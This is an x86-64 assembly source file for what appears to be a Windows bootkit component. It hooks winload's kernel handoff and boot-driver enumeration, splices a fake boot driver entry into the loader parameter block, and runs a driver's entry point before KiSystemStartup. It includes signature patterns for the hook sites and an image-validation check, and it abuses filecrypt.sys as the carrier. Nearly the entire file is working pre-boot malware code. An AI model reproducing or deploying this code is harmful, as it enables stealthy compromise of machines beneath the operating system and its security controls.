    bits 64
    section .text
    default rel
    global HookedWinloadXfer
    global HookedGetBootDrivers
    global WinloadXferPatternSize
    global GetBootDriversPatternSize
    global ValidateImagePatternSize
    global TargetDriverPatternSize
    global WinloadXferPattern
    global GetBootDriversPattern
    global ValidateImagePattern
    global TargetDriverPattern

    TargetDriverPatternSize: equ TargetDriverPatternEnd - TargetDriverPattern
    WinloadXferPatternSize: equ WinloadXferPatternEnd - WinloadXferPattern
    GetBootDriversPatternSize: equ GetBootDriversPatternEnd - GetBootDriversPattern
    ValidateImagePatternSize: equ ValidateImagePatternEnd - ValidateImagePattern

HookedWinloadXfer:
                                    ; rcx: ploader_parameter_block
                                    ; rdx: KiSystemStartup
    push rax
    push rbx
                                    ; unlink our fake entry
    mov rbx, [rcx + 0x30]           ; BootDriverListHead.Flink
    mov rax, [rbx]                  ; Flink
    mov [rcx + 0x30], rax           ; BootDriverListHead.Flink
    lea rax, [rcx + 0x30]           ; BootDriverListHead
    mov [rbx + 8], rax              ; Blink


                                    ; invoke driver entry instead of KiSystemStartup
                                    ; DriverLdrTableEntry
    mov rax, [BootDriverListEntry + 0x30]
    mov rax, [rax + 0x38]           ; EntryPoint
    mov r13, rax                    ; Driver!DriverEntry
    mov r8, rdx                     ; Pass KiSystemStartup as parameter to DriverEntry

    pop rbx
    pop rax

    wbinvd                          ; the hook overwrote these instructions
    sub rax, rax
    ret

HookedGetBootDrivers:
    ; rsi = loader block

    push rax
    push rbx
    mov rax, [rsi + 0x30]           ; BootDriverListHead
    mov [BootDriverListEntry], rax
    lea rax, [BootDriverListEntry]
    mov [rsi + 0x30], rax           ; add new entry

                                    ; Filepath.Length
    mov WORD[rax + 0x10], ImagePathEnd - ImagePath
                                    ; Filepath.MaximumLength
    mov WORD[rax + 0x12], ImagePathEnd - ImagePath
    lea rbx, [ImagePath]
    mov [rax + 0x18], rbx           ; FilePath.Buffer

    pop rbx
    pop rax
    
    mov rsi, [r11 + 0x38]
    mov rdi, [r11 + 0x40]
    mov rsp, r11
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    ret

WinloadXferPattern:
    wbinvd
    db 0x48, 0x2B, 0xC0         ; sub rax, rax
    db 0x66                     ; nasm assembles next instruction as eax
    mov ss, ax
WinloadXferPatternEnd:
GetBootDriversPattern:
    lea r11, [rsp + 0x70]
    db 0x8B, 0xC3               ; mov eax, ebx
    mov rbx, [r11 + 0x30]
    mov rsi, [r11 + 0x38]
GetBootDriversPatternEnd:
ValidateImagePattern:
    db 0x8b, 0xd8               ; mov ebx, eax
    cmp eax, 0xC000022D
ValidateImagePatternEnd:

; filecrypt.sys was chosen because it is:
;   - sufficiently large
;   - readable in a single int 13h call
;   - not loaded until after kernel initialization
TargetDriverPattern: db 'filecrypt.pdb', 0
TargetDriverPatternEnd: db 0xFF
ImagePath: dw __utf16__('System32\drivers\filecrypt.sys'), 0
ImagePathEnd:
BootDriverListEntry:            ; BOOT_DRIVER_LIST_ENTRY
    times 0x10 db 0             ; Link
FilePath:
    times 0x10 db 0